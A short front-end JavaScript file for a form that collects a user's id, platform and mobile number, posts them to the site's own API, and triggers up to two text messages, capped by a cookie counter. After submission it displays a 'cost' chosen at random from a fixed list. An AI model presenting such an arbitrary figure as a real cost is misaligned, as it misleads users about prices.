const form = document.getElementById("form")
const mobile = document.getElementById("mobile")
const page1 = document.getElementById("div-1")
const page2 = document.getElementById("div-1000")

document.getElementById('id').value = Cookies.get('id')
document.getElementById('platform').value = Cookies.get('platform')
var arr = [1000, 1200, 1500, 1700, 2000, 2200, 2500]
if (Cookies.get('chances') == undefined) {
    Cookies.set('chances', 0, { expires: 30, path: '/' })
}


form.addEventListener('submit', (e) => {
    e.preventDefault()

    var myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

    var urlencoded = new URLSearchParams();
    urlencoded.append("id", form.elements[0].value);
    urlencoded.append("platform", form.elements[1].value);
    urlencoded.append("mobile", form.elements[2].value);

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: urlencoded,
        redirect: 'follow'
    };

    // console.log('fetching')
    fetch("/api/updateMobile", requestOptions)
        .then(response => response.text())
        .then(result => {
            if (result == 'OK') {
                Cookies.set('chances', parseInt(Cookies.get('chances')) + 1)
                if (parseInt(Cookies.get('chances')) <= 2) {
                    // SEND MESSAGES
                    fetch(`/api/message/${mobile.value}`).then(res => console.log(res)).catch(eror => console.log('error', eror))
                }
            }
        })
        .catch(error => console.log('error', error));


    document.getElementById('cost').innerHTML = arr[Math.floor(Math.random() * arr.length)];
    page1.classList.add('remove')
    page2.classList.remove('remove')

    mobile.value = ''
})